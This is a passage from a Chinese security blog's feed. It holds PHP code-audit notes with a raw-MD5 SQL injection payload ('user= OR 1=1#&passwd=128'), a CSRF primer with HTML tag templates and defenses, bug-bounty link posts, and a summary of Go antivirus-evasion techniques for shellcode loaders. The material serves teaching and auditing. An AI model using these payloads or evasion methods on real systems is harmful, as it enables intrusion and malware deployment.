title="修复建议："></a>修复建议：</h4><p>使用 <strong>$_SERVER[‘SCRIPT_NAME’]</strong> 代替即可</p><h3 id="深入理解-REQUESTS数组"><a href="#深入理解-REQUESTS数组" class="headerlink" title="深入理解$_REQUESTS数组"></a>深入理解$_REQUESTS数组</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day16/files/README.md">红日安全]代码审计Day16 - 深入理解$_REQUESTS数组</a></p><p>超全局数组 <strong>$_REQUEST</strong> 中的数据，是 <strong>$_GET</strong> 、 <strong>$_POST</strong> 、 <strong>$_COOKIE</strong> 的合集，而且数据是复制过去的，并不是引用。</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232129558.png"></p><p>所以很多时候仅仅是对**$_GET** 、 <strong>$_POST</strong>的传参做了限制，但利用时的变量确实使用**$_REQUEST**传入的，相当于并没有进行过滤。</p><h4 id="利用场景：-14"><a href="#利用场景：-14" class="headerlink" title="利用场景："></a>利用场景：</h4><p>XSS，SQL注入等</p><h4 id="修复建议：-15"><a href="#修复建议：-15" class="headerlink" title="修复建议："></a><strong>修复建议：</strong></h4><p>优化参数处理逻辑。</p><h3 id="Raw-MD5-Hash引发的注入"><a href="#Raw-MD5-Hash引发的注入" class="headerlink" title="Raw MD5 Hash引发的注入"></a>Raw MD5 Hash引发的注入</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day17/files/README.md">红日安全]代码审计Day17 - Raw MD5 Hash引发的注入</a></p><blockquote><p><a href="http://php.net/manual/zh/function.md5.php">md5</a> — 计算字符串的 MD5 散列值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">md5</span> ( <span class="keyword">string</span> <span class="variable">$str</span> [, <span class="keyword">bool</span> <span class="variable">$raw_output</span> = <span class="literal">false</span> ] )</span><br></pre></td></tr></table></figure><p>如果可选的 <code>raw_output</code> 被设置为 <strong>TRUE</strong>，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232133969.png"></p><p>案例：</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232134254.png"></p><p>我可以控制的点有两个变量，一个是 <strong>$user</strong> ，一个是 <strong>$pass</strong> ，**$pass** 经过了 <strong>md5</strong> 的处理，但是返回字段不是标准的md5值，**$user** 经过了 <strong>addslashes</strong> 函数的处理，无法引入特殊符号去闭合。</p><p>如果我们经过 <strong>$pass &#x3D; md5($this-&gt;password, true);</strong> 处理之后的值逃逸出一个反斜杆，那么实际上带入到数据库的值就如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user s where password=<span class="string">&#x27;xxxxxx\&#x27; and user=&#x27;</span>xxx<span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232135110.png" alt="3"></p><p>发现 <strong>md5(128, true)</strong> 最后的结果带有反斜杠。</p><p>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user= OR <span class="number">1</span>=<span class="number">1</span><span class="comment">#&amp;passwd=128</span></span><br></pre></td></tr></table></figure><p>带入到数据库查询的语句如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user s where password=<span class="string">&#x27;v�a�n���l���q��\&#x27; and user=&#x27;</span> OR <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="利用场景：-15"><a href="#利用场景：-15" class="headerlink" title="利用场景："></a>利用场景：</h4><p>CTF遇见过</p><h4 id="修复建议：-16"><a href="#修复建议：-16" class="headerlink" title="修复建议："></a>修复建议：</h4><p>建议在使用 <strong>md5</strong> 函数的时候，不要将 <strong>$raw_output</strong> 字段设置为<strong>true</strong> 。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC姿势(二)</title>
      <link href="/2022/04/17/SRC%E5%A7%BF%E5%8A%BF(%E4%BA%8C)/"/>
      <url>/2022/04/17/SRC%E5%A7%BF%E5%8A%BF(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h1 id="SRC姿势-二"><a href="#SRC姿势-二" class="headerlink" title="SRC姿势(二)"></a>SRC姿势(二)</h1><p>新增漏洞银行分享和挖百度的大佬的分享</p><p>未来将会收集点国外赏金猎人的思路。</p><p>github地址：<a href="https://github.com/LiAoRJ/src">LiAoRJ&#x2F;src: SRC姿势收集 (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go免杀思路研究</title>
      <link href="/2022/04/16/go%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%A0%94%E7%A9%B6/"/>
      <url>/2022/04/16/go%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="go免杀思路研究"><a href="#go免杀思路研究" class="headerlink" title="go免杀思路研究"></a>go免杀思路研究</h1><p>今天看了几个Go语言的免杀项目，由于这些项目发布已经有些时间了，免杀效果早已大不如前，遂想将这几个项目核心思想结合一下，生成一个新的免杀项目，这里总结一下几个项目的核心思想：</p><ol><li><p>Syscall直接系统调用</p></li><li><p>shellcode远程加载（远程加载图片中的shellcode）</p></li><li><p>shellcode混淆加密（以Base64为例）</p></li><li><p>沙箱绕过</p></li><li><p>随机变量名生成</p><span id="more"></span></li></ol><p>参考的项目如下：</p><p><a href="https://github.com/pureqh/bypassAV">pureqh&#x2F;bypassAV: 免杀shellcode加载器 (github.com)</a></p><p><a href="https://github.com/Hangingsword/HouQing">Hangingsword&#x2F;HouQing (github.com)</a></p><p><a href="https://github.com/huadema/Gobypass">huadema&#x2F;Gobypass (github.com)</a></p><p>目前火绒没绕过去。。。这令我很吃惊，360、def完美落地，火绒我研究一下，源码比较拙劣，先不放了，放张打包成exe后的VT检测图</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204162227082.png"></p>]]></content>
      
      
      <categories>
          
          <category> 免杀研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重新研究一下CSRF的攻击与防御</title>
      <link href="/2022/04/14/%E9%87%8D%E6%96%B0%E7%A0%94%E7%A9%B6%E4%B8%80%E4%B8%8BCSRF%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
      <url>/2022/04/14/%E9%87%8D%E6%96%B0%E7%A0%94%E7%A9%B6%E4%B8%80%E4%B8%8BCSRF%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p><strong>定义：</strong></p><p>跨站请求伪造</p><p>挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法</p><span id="more"></span><p><strong>对比XSS：</strong> 跟跨网站脚本(XSS)相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.用户C打开浏览器，访问受信任网站<span class="selector-tag">A</span>，输入用户名和密码请求登录网站<span class="selector-tag">A</span>;</span><br><span class="line"><span class="number">2</span>.在用户信息通过验证后，网站<span class="selector-tag">A</span>产生Cookie信息并返回给浏览器，此时用户登录网站<span class="selector-tag">A</span>成功，可以正常发送请求到网站<span class="selector-tag">A</span>;</span><br><span class="line"><span class="number">3</span>.用户未退出网站<span class="selector-tag">A</span>之前，在同一浏览器中，打开一个TAB页访问网站<span class="selector-tag">B</span>;</span><br><span class="line"><span class="number">4</span>.网站<span class="selector-tag">B</span>接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点<span class="selector-tag">A</span>;</span><br><span class="line"><span class="number">5</span>.浏览器在接收到这些攻击性代码后，根据网站<span class="selector-tag">B</span>的请求，在用户不知情的情况下携带Cookie信息，向网站<span class="selector-tag">A</span>发出请求。网站<span class="selector-tag">A</span>并不知道该请求其实是由<span class="selector-tag">B</span>发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站<span class="selector-tag">B</span>的恶意代码被执行。</span><br></pre></td></tr></table></figure><p><strong>要被CSRF攻击，必须同时满足两个条件：</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 登录受信任网站<span class="selector-tag">A</span>，并在本地生成Cookie。</span><br><span class="line"><span class="number">2</span>. 在不登出<span class="selector-tag">A</span>的情况下，访问危险网站<span class="selector-tag">B</span>。</span><br></pre></td></tr></table></figure><h2 id="GET型CSRF"><a href="#GET型CSRF" class="headerlink" title="GET型CSRF"></a>GET型CSRF</h2><h5 id="乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）"><a href="#乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）" class="headerlink" title="乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）"></a>乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）</h5><p><a href="https://wooyun.website/show.php?uid=S8XttXpbELTcgJTjRpr0Gq6dLdNmnRagM9rJmzPt">https://wooyun.website/show.php?uid=S8XttXpbELTcgJTjRpr0Gq6dLdNmnRagM9rJmzPt</a></p><h5 id="新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）"><a href="#新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）" class="headerlink" title="新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）"></a>新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）</h5><p><a href="https://wooyun.website/show.php?uid=6HimWDmTrwk2d0kEhtwey5NJihxQEID4pPWgrsWp">https://wooyun.website/show.php?uid=6HimWDmTrwk2d0kEhtwey5NJihxQEID4pPWgrsWp</a></p><h2 id="POST型CSRF"><a href="#POST型CSRF" class="headerlink" title="POST型CSRF"></a>POST型CSRF</h2><h5 id="中国网络电视台官方CSRF刷微博粉"><a href="#中国网络电视台官方CSRF刷微博粉" class="headerlink" title="中国网络电视台官方CSRF刷微博粉"></a>中国网络电视台官方CSRF刷微博粉</h5><p><a href="https://wooyun.website/show.php?uid=pmxEDefy2wx977fTMeNj9NCHGkxJ5eTMh3pUlXPh">https://wooyun.website/show.php?uid=pmxEDefy2wx977fTMeNj9NCHGkxJ5eTMh3pUlXPh</a></p><h5 id="新浪微博csrf刷粉丝"><a href="#新浪微博csrf刷粉丝" class="headerlink" title="新浪微博csrf刷粉丝"></a>新浪微博csrf刷粉丝</h5><p><a href="https://wooyun.website/show.php?uid=eUTLauXnYMYB2oRcmcV6F4krh3q0HyGJF9IcMnyC">https://wooyun.website/show.php?uid=eUTLauXnYMYB2oRcmcV6F4krh3q0HyGJF9IcMnyC</a></p><h2 id="补充一点东西"><a href="#补充一点东西" class="headerlink" title="补充一点东西"></a>补充一点东西</h2><h4 id="GET-CSRF使用方法"><a href="#GET-CSRF使用方法" class="headerlink" title="GET CSRF使用方法"></a>GET CSRF使用方法</h4><p>GET请求不一定必须限制为FORM表单，JS请求进行提交，img、iframe、link等标签，css属性都可以进行GET请求</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. script标签利用</span><br><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>&gt;请点击我</span><br><span class="line">2. iframe利用</span><br><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">3. img标签利用</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>/&gt;</span><br><span class="line">远程加载图片，这个利用点一般在引入远程图片时，例如 头像</span><br><span class="line">4.link标签利用</span><br><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attribute">type</span>=<span class="string">&#x27;text/css&#x27;</span> <span class="attribute">href</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>&gt;</span><br><span class="line">4. CSS - backgroud利用</span><br><span class="line">利用 CSS中 background样式中的url来加载远程机器上的内容，从而对url中的内容发送HTTP请求</span><br><span class="line">body</span><br><span class="line">&#123;background:url(<span class="string">&quot;恶意CSRF_URL&quot;</span>);&#125;</span><br></pre></td></tr></table></figure><h2 id="CSRF蠕虫"><a href="#CSRF蠕虫" class="headerlink" title="CSRF蠕虫"></a>CSRF蠕虫</h2><h5 id="音悦台一处CSRF（2）-已经证明可构造蠕虫"><a href="#音悦台一处CSRF（2）-已经证明可构造蠕虫" class="headerlink" title="音悦台一处CSRF（2）[已经证明可构造蠕虫]"></a>音悦台一处CSRF（2）[已经证明可构造蠕虫]</h5><p><a href="https://wooyun.website/show.php?uid=0uuWjJIpThFyMfSHQaiWRvV9YutUbbnmD9NAz6MD">https://wooyun.website/show.php?uid=0uuWjJIpThFyMfSHQaiWRvV9YutUbbnmD9NAz6MD</a></p><h2 id="XSS-CSRF组合拳"><a href="#XSS-CSRF组合拳" class="headerlink" title="XSS+CSRF组合拳"></a>XSS+CSRF组合拳</h2><p>普通的CSRF需要诱导受害者点击构造的CSRF连接，但当CSRF与XSS组合之后，就能实现无意识的攻击了</p><h5 id="壹心理存储型XSS-CSRF造成蠕虫攻击"><a href="#壹心理存储型XSS-CSRF造成蠕虫攻击" class="headerlink" title="壹心理存储型XSS+CSRF造成蠕虫攻击"></a>壹心理存储型XSS+CSRF造成蠕虫攻击</h5><p><a href="https://wooyun.website/show.php?uid=wWfl0XRqzAeneYfhEsjb0tmnQ71JE6xqubtOH5kl">https://wooyun.website/show.php?uid=wWfl0XRqzAeneYfhEsjb0tmnQ71JE6xqubtOH5kl</a></p><h2 id="在业界目前防御-CSRF-攻击主要有四种策略"><a href="#在业界目前防御-CSRF-攻击主要有四种策略" class="headerlink" title="在业界目前防御 CSRF 攻击主要有四种策略"></a>在业界目前防御 CSRF 攻击主要有四种策略</h2><ol><li>验证 HTTP Referer 字段；</li><li>在请求地址中添加 token 并验证；</li><li>在 HTTP 头中自定义属性并验证；</li><li>Chrome 浏览器端启用 SameSite cookie</li></ol><p>对于绕过的方法，之后再讲</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC姿势(一)</title>
      <link href="/2022/04/14/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%80)/"/>
      <url>/2022/04/14/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="SRC姿势-一"><a href="#SRC姿势-一" class="headerlink" title="SRC姿势(一)"></a>SRC姿势(一)</h1><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204141050517.png"></p><p>github地址：<a href="https://github.com/LiAoRJ/src">LiAoRJ&#x2F;src: SRC姿势收集 (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
